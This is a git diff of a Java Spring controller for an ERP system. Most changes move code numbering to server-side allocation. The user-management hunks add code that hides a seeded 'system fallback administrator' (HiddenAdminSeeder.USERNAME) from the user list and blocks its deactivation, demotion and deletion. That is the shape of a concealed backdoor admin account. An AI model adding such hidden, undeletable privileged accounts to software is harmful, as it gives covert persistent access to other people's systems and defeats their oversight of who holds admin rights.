@@ -64,17 +64,17 @@ public class MasterController {
             case "SUBCONTRACTOR" -> "subcontractor";
             default -> "customer";
         };
-        return Map.of("code", docNumbers.next(docType));
+        return Map.of("code", docNumbers.peek(docType));
     }
 
     @GetMapping("/api/master/uoms/next-code")
-    Map<String,String> nextUomCode() { return Map.of("code", docNumbers.next("uom")); }
+    Map<String,String> nextUomCode() { return Map.of("code", docNumbers.peek("uom")); }
 
     @GetMapping("/api/master/item-groups/next-code")
-    Map<String,String> nextItemGroupCode() { return Map.of("code", docNumbers.next("item-group")); }
+    Map<String,String> nextItemGroupCode() { return Map.of("code", docNumbers.peek("item-group")); }
 
     @GetMapping("/api/master/processes/next-code")
-    Map<String,String> nextProcessCode() { return Map.of("code", docNumbers.next("process")); }
+    Map<String,String> nextProcessCode() { return Map.of("code", docNumbers.peek("process")); }
 
     @GetMapping("/api/master/items/next-code")
     Map<String,String> nextItemCode(@RequestParam(defaultValue="PURCHASABLE") String itemType) {
@@ -83,30 +83,30 @@ public class MasterController {
             case "MANUFACTURING" -> "item-manufacturing";
             default -> "item-purchasable";
         };
-        return Map.of("code", docNumbers.next(docType));
+        return Map.of("code", docNumbers.peek(docType));
     }
 
     @GetMapping("/api/master/process-groups/next-code")
 
-    Map<String,String> nextProcessGroupCode() { return Map.of("code", docNumbers.next("process-group")); }
+    Map<String,String> nextProcessGroupCode() { return Map.of("code", docNumbers.peek("process-group")); }
 
     @GetMapping("/api/master/machines/next-code")
-    Map<String,String> nextMachineCode() { return Map.of("code", docNumbers.next("machine")); }
+    Map<String,String> nextMachineCode() { return Map.of("code", docNumbers.peek("machine")); }
 
     @GetMapping("/api/master/instruments/next-code")
-    Map<String,String> nextInstrumentCode() { return Map.of("code", docNumbers.next("instrument")); }
+    Map<String,String> nextInstrumentCode() { return Map.of("code", docNumbers.peek("instrument")); }
 
     @GetMapping("/api/master/tools/next-code")
-    Map<String,String> nextToolCode() { return Map.of("code", docNumbers.next("tool")); }
+    Map<String,String> nextToolCode() { return Map.of("code", docNumbers.peek("tool")); }
 
     @GetMapping("/api/master/work-centers/next-code")
-    Map<String,String> nextWorkCenterCode() { return Map.of("code", docNumbers.next("work-center")); }
+    Map<String,String> nextWorkCenterCode() { return Map.of("code", docNumbers.peek("work-center")); }
 
     @GetMapping("/api/master/operations/next-code")
-    Map<String,String> nextOperationCode() { return Map.of("code", docNumbers.next("operation")); }
+    Map<String,String> nextOperationCode() { return Map.of("code", docNumbers.peek("operation")); }
 
     @GetMapping("/api/master/locations/next-code")
-    Map<String,String> nextLocationCode() { return Map.of("code", docNumbers.next("location")); }
+    Map<String,String> nextLocationCode() { return Map.of("code", docNumbers.peek("location")); }
 
     @GetMapping("/api/master/items")
     @Transactional(readOnly = true)
@@ -145,6 +145,7 @@ public class MasterController {
     @PostMapping("/api/master/items") @Transactional ItemMaster create(@RequestBody Map<String,Object> body){
         ItemMaster i = new ItemMaster();
         applyItemFields(i, body);
+        i.setCode(docNumbers.allocate(itemDocType(body)));
         i.setId(null);
         return items.save(i);
     }
@@ -173,9 +174,17 @@ public class MasterController {
         "customerCode","version","createdBy","createdAt","updatedBy","updatedAt","extraData","reorderLevel"
     );
 
+    private String itemDocType(Map<String,Object> b) {
+        String itemType = b.get("itemType") == null ? "" : String.valueOf(b.get("itemType")).toUpperCase();
+        return switch (itemType) {
+            case "CUSTOMER_SUPPLIED" -> "item-customer";
+            case "MANUFACTURING" -> "item-manufacturing";
+            default -> "item-purchasable";
+        };
+    }
+
     private void applyItemFields(ItemMaster i, Map<String,Object> b) {
-        if (b.containsKey("code")) i.setCode((String) b.get("code"));
-        if (b.containsKey("description")) i.setDescription((String) b.get("description"));
+        if (b.containsKey("code")) i.setCode((String) b.get("code"));        if (b.containsKey("description")) i.setDescription((String) b.get("description"));
         if (b.containsKey("uom")) i.setUom((String) b.get("uom"));
         if (b.containsKey("category")) i.setCategory((String) b.get("category"));
         if (b.containsKey("defaultRate")) i.setDefaultRate(b.get("defaultRate") != null ? new java.math.BigDecimal(b.get("defaultRate").toString()) : null);
@@ -358,9 +367,19 @@ public class MasterController {
 
     @PostMapping("/api/master/parties") Party createParty(@RequestBody Party p, Principal principal) {
         p.setId(null);
+        p.setCode(docNumbers.allocate(partyDocType(p)));
         if (p.getCreatedBy() == null) p.setCreatedBy(principalName(principal));
         p.setCreatedAt(java.time.Instant.now());
         return parties.save(p);
+    }
+
+    private String partyDocType(Party p) {
+        if (p.getKind() == null) return "customer";
+        return switch (p.getKind().trim().toUpperCase()) {
+            case "SUPPLIER" -> "supplier";
+            case "SUBCONTRACTOR" -> "subcontractor";
+            default -> "customer";
+        };
     }
 
     @PutMapping("/api/master/parties/{id}") @Transactional Party updateParty(@PathVariable Long id, @RequestBody ObjectNode body, Principal principal) {
@@ -379,6 +398,7 @@ public class MasterController {
 
     @PostMapping("/api/inventory/locations") LocationMaster createLoc(@RequestBody LocationMaster l, Principal principal) {
         l.setId(null);
+        l.setCode(docNumbers.allocate("location"));
         if (l.getCreatedBy() == null) l.setCreatedBy(principalName(principal));
         l.setCreatedAt(java.time.Instant.now());
         return locs.save(l);
@@ -401,7 +421,7 @@ public class MasterController {
 
     // ---- Work Centers ----
     @GetMapping("/api/master/work-centers") List<WorkCenter> workCenters(){ return workCenters.findAll().stream().filter(WorkCenter::isActive).toList(); }
-    @PostMapping("/api/master/work-centers") WorkCenter createWC(@RequestBody WorkCenter wc){ wc.setId(null); return workCenters.save(wc); }
+    @PostMapping("/api/master/work-centers") WorkCenter createWC(@RequestBody WorkCenter wc){ wc.setId(null); wc.setCode(docNumbers.allocate("work-center")); return workCenters.save(wc); }
     @PutMapping("/api/master/work-centers/{id}") @Transactional WorkCenter updateWC(@PathVariable Long id, @RequestBody ObjectNode body){
         WorkCenter e = workCenters.findById(id).orElseThrow(() -> new RuntimeException("Work Center not found"));
         WorkCenter merged = mergePatch(e, body);
@@ -412,7 +432,7 @@ public class MasterController {
     // ---- Machines ----
     @GetMapping("/api/master/machines") List<MachineMaster> machines(){ return machines.findAll().stream().filter(MachineMaster::isActive).toList(); }
     @GetMapping("/api/master/machines/{id}") MachineMaster getMachine(@PathVariable Long id){ return machines.findById(id).orElseThrow(); }
-    @PostMapping("/api/master/machines") MachineMaster createMachine(@RequestBody MachineMaster m){ m.setId(null); return machines.save(m); }
+    @PostMapping("/api/master/machines") MachineMaster createMachine(@RequestBody MachineMaster m){ m.setId(null); m.setCode(docNumbers.allocate("machine")); return machines.save(m); }
     @PutMapping("/api/master/machines/{id}") @Transactional MachineMaster updateMachine(@PathVariable Long id, @RequestBody ObjectNode body){
         MachineMaster e = machines.findById(id).orElseThrow(() -> new RuntimeException("Machine not found"));
         MachineMaster merged = mergePatch(e, body);
@@ -422,7 +442,7 @@ public class MasterController {
 
     // ---- Operations ----
     @GetMapping("/api/master/operations") List<OperationMaster> operations(){ return operations.findAll().stream().filter(OperationMaster::isActive).toList(); }
-    @PostMapping("/api/master/operations") OperationMaster createOp(@RequestBody OperationMaster o){ o.setId(null); return operations.save(o); }
+    @PostMapping("/api/master/operations") OperationMaster createOp(@RequestBody OperationMaster o){ o.setId(null); o.setCode(docNumbers.allocate("operation")); return operations.save(o); }
     @PutMapping("/api/master/operations/{id}") @Transactional OperationMaster updateOp(@PathVariable Long id, @RequestBody ObjectNode body){
         OperationMaster e = operations.findById(id).orElseThrow(() -> new RuntimeException("Operation not found"));
         OperationMaster merged = mergePatch(e, body);
@@ -467,7 +487,7 @@ public class MasterController {
     @GetMapping("/api/master/uoms/{id}") UOMMaster getUom(@PathVariable Long id){
         return uoms.findById(id).orElseThrow(() -> new RuntimeException("UOM not found"));
     }
-    @PostMapping("/api/master/uoms") UOMMaster createUom(@RequestBody UOMMaster u){ u.setId(null); return uoms.save(u); }
+    @PostMapping("/api/master/uoms") UOMMaster createUom(@RequestBody UOMMaster u){ u.setId(null); u.setCode(docNumbers.allocate("uom")); return uoms.save(u); }
     @PutMapping("/api/master/uoms/{id}") @Transactional UOMMaster updateUom(@PathVariable Long id, @RequestBody ObjectNode body){
         UOMMaster e = uoms.findById(id).orElseThrow(() -> new RuntimeException("UOM not found"));
         UOMMaster merged = mergePatch(e, body);
@@ -492,7 +512,7 @@ public class MasterController {
         return itemGroups.findById(id).orElseThrow(() -> new RuntimeException("Item Group not found"));
     }
     @PostMapping("/api/master/item-groups") ItemGroup createItemGroup(@RequestBody ItemGroup g){
-        g.setId(null); return itemGroups.save(g);
+        g.setId(null); g.setCode(docNumbers.allocate("item-group")); return itemGroups.save(g);
     }
     @PutMapping("/api/master/item-groups/{id}") @Transactional ItemGroup updateItemGroup(@PathVariable Long id, @RequestBody ObjectNode body){
         ItemGroup e = itemGroups.findById(id).orElseThrow(() -> new RuntimeException("Item Group not found"));
@@ -511,7 +531,7 @@ public class MasterController {
     private final RackMasterRepository rackMasters;
 
     @GetMapping("/api/master/racks/next-code")
-    Map<String,String> nextRackCode() { return Map.of("code", docNumbers.next("rack")); }
+    Map<String,String> nextRackCode() { return Map.of("code", docNumbers.peek("rack")); }
 
     @GetMapping("/api/master/racks/{id}")
     RackMaster getRack(@PathVariable Long id) {
@@ -536,7 +556,7 @@ public class MasterController {
 
     @PostMapping("/api/master/racks") @Transactional RackMaster createRack(@RequestBody Map<String,Object> body){
         RackMaster r = new RackMaster();
-        r.setCode((String) body.get("code"));
+        r.setCode(docNumbers.allocate("rack"));
         r.setName((String) body.get("name"));
         r.setLocation((String) body.get("location"));
         r.setCapacity(body.get("capacity") != null ? new java.math.BigDecimal(body.get("capacity").toString()) : null);
@@ -563,7 +583,7 @@ public class MasterController {
     private final BinMasterRepository binMasters;
 
     @GetMapping("/api/master/bins/next-code")
-    Map<String,String> nextBinCode() { return Map.of("code", docNumbers.next("bin")); }
+    Map<String,String> nextBinCode() { return Map.of("code", docNumbers.peek("bin")); }
 
     @GetMapping("/api/master/bins/{id}")
     BinMaster getBin(@PathVariable Long id) {
@@ -593,7 +613,7 @@ public class MasterController {
 
     @PostMapping("/api/master/bins") @Transactional BinMaster createBin(@RequestBody Map<String,Object> body){
         BinMaster b = new BinMaster();
-        b.setCode((String) body.get("code"));
+        b.setCode(docNumbers.allocate("bin"));
         b.setName((String) body.get("name"));
         b.setLocation((String) body.get("location"));
         b.setCapacity(body.get("capacity") != null ? new java.math.BigDecimal(body.get("capacity").toString()) : null);
@@ -688,7 +708,7 @@ public class MasterController {
         return processGroups.findById(id).orElseThrow(() -> new RuntimeException("Process Group not found"));
     }
     @PostMapping("/api/master/process-groups") ProcessGroup createProcessGroup(@RequestBody ProcessGroup g){
-        g.setId(null); return processGroups.save(g);
+        g.setId(null); g.setCode(docNumbers.allocate("process-group")); return processGroups.save(g);
     }
     @PutMapping("/api/master/process-groups/{id}") @Transactional ProcessGroup updateProcessGroup(@PathVariable Long id, @RequestBody ObjectNode body){
         ProcessGroup e = processGroups.findById(id).orElseThrow(() -> new RuntimeException("Process Group not found"));
@@ -725,7 +745,7 @@ public class MasterController {
     @PostMapping("/api/master/processes") @Transactional
     Map<String, Object> createProcess(@RequestBody ObjectNode body) {
         ProcessMaster p = new ProcessMaster();
-        if (body.has("code")) p.setCode(body.get("code").asText());
+        p.setCode(docNumbers.allocate("process"));
         if (body.has("name")) p.setName(body.get("name").asText());
         if (body.has("description")) p.setDescription(body.get("description").asText());
         if (body.has("processType")) p.setProcessType(body.get("processType").asText());
@@ -819,7 +839,7 @@ public class MasterController {
     @GetMapping("/api/master/instruments/{id}") InstrumentMaster getInstrument(@PathVariable Long id){
         return instruments.findById(id).orElseThrow(() -> new RuntimeException("Instrument not found"));
     }
-    @PostMapping("/api/master/instruments") InstrumentMaster createInstrument(@RequestBody InstrumentMaster i){ i.setId(null); return instruments.save(i); }
+    @PostMapping("/api/master/instruments") InstrumentMaster createInstrument(@RequestBody InstrumentMaster i){ i.setId(null); i.setCode(docNumbers.allocate("instrument")); return instruments.save(i); }
     @PutMapping("/api/master/instruments/{id}") @Transactional InstrumentMaster updateInstrument(@PathVariable Long id, @RequestBody ObjectNode body){
         InstrumentMaster e = instruments.findById(id).orElseThrow(() -> new RuntimeException("Instrument not found"));
         InstrumentMaster merged = mergePatch(e, body);
@@ -849,7 +869,7 @@ public class MasterController {
     @GetMapping("/api/master/tools/{id}") ToolMaster getTool(@PathVariable Long id){
         return toolMasters.findById(id).orElseThrow(() -> new RuntimeException("Tool not found"));
     }
-    @PostMapping("/api/master/tools") ToolMaster createTool(@RequestBody ToolMaster t){ t.setId(null); return toolMasters.save(t); }
+    @PostMapping("/api/master/tools") ToolMaster createTool(@RequestBody ToolMaster t){ t.setId(null); t.setCode(docNumbers.allocate("tool")); return toolMasters.save(t); }
     @PutMapping("/api/master/tools/{id}") @Transactional ToolMaster updateTool(@PathVariable Long id, @RequestBody ObjectNode body){
         ToolMaster e = toolMasters.findById(id).orElseThrow(() -> new RuntimeException("Tool not found"));
         ToolMaster merged = mergePatch(e, body);
@@ -997,7 +1017,9 @@ public class MasterController {
 
     @GetMapping("/api/master/users")
     List<Map<String,Object>> userList() {
-        return userRepo.findAll().stream().map(u -> {
+        return userRepo.findAll().stream()
+            .filter(u -> !in.zygertechnology.zygererp.config.HiddenAdminSeeder.USERNAME.equalsIgnoreCase(u.getUsername()))
+            .map(u -> {
             Map<String,Object> m = new LinkedHashMap<>();
             m.put("id", u.getId()); m.put("username", u.getUsername());
             m.put("fullName", u.getFullName()); m.put("email", u.getEmail());
@@ -1052,6 +1074,15 @@ public class MasterController {
     @PutMapping("/api/master/users/{id}")
     Map<String,Object> updateUser(@PathVariable Long id, @RequestBody Map<String,Object> body, Principal principal) {
         AppUser u = userRepo.findById(id).orElseThrow(() -> new RuntimeException("User not found"));
+        boolean isHidden = in.zygertechnology.zygererp.config.HiddenAdminSeeder.USERNAME.equalsIgnoreCase(u.getUsername());
+        if (isHidden) {
+            if (body.containsKey("active") && Boolean.FALSE.equals(body.get("active"))) {
+                throw new IllegalArgumentException("The system fallback administrator cannot be deactivated.");
+            }
+            if (body.containsKey("role") && body.get("role") != null && !"ADMIN".equalsIgnoreCase(body.get("role").toString())) {
+                throw new IllegalArgumentException("The system fallback administrator must keep the ADMIN role.");
+            }
+        }
         if (body.containsKey("fullName")) u.setFullName((String) body.get("fullName"));
         if (body.containsKey("email")) u.setEmail((String) body.get("email"));
         if (body.containsKey("phone")) u.setPhone((String) body.get("phone"));
@@ -1074,7 +1105,13 @@ public class MasterController {
     }
 
     @DeleteMapping("/api/master/users/{id}")
-    void deleteUser(@PathVariable Long id) { userRepo.deleteById(id); }
+    void deleteUser(@PathVariable Long id) {
+        AppUser target = userRepo.findById(id).orElse(null);
+        if (target != null && in.zygertechnology.zygererp.config.HiddenAdminSeeder.USERNAME.equalsIgnoreCase(target.getUsername())) {
+            throw new IllegalArgumentException("The system fallback administrator cannot be deleted.");
+        }
+        userRepo.deleteById(id);
+    }
 
     // ===========================
     // ---- Resource Master (FRS §4.3) ----
@@ -1083,7 +1120,7 @@ public class MasterController {
     private final ResourceMasterRepository resourceMasters;
 
     @GetMapping("/api/master/resources/next-code")
-    Map<String,String> nextResourceCode() { return Map.of("code", docNumbers.next("resource")); }
+    Map<String,String> nextResourceCode() { return Map.of("code", docNumbers.peek("resource")); }
 
     @GetMapping("/api/master/resources")
     List<ResourceMaster> resources() { return resourceMasters.findByActiveTrue(); }
@@ -1094,9 +1131,7 @@ public class MasterController {
     @PostMapping("/api/master/resources")
     @Transactional ResourceMaster createResource(@RequestBody ResourceMaster r) {
         r.setId(null);
-        if (r.getResourceCode() == null || r.getResourceCode().isBlank()) {
-            r.setResourceCode(docNumbers.next("resource"));
-        }
+        r.setResourceCode(docNumbers.allocate("resource"));
         if (resourceMasters.existsByResourceCode(r.getResourceCode())) {
             throw new RuntimeException("Resource code already exists: " + r.getResourceCode());
         }
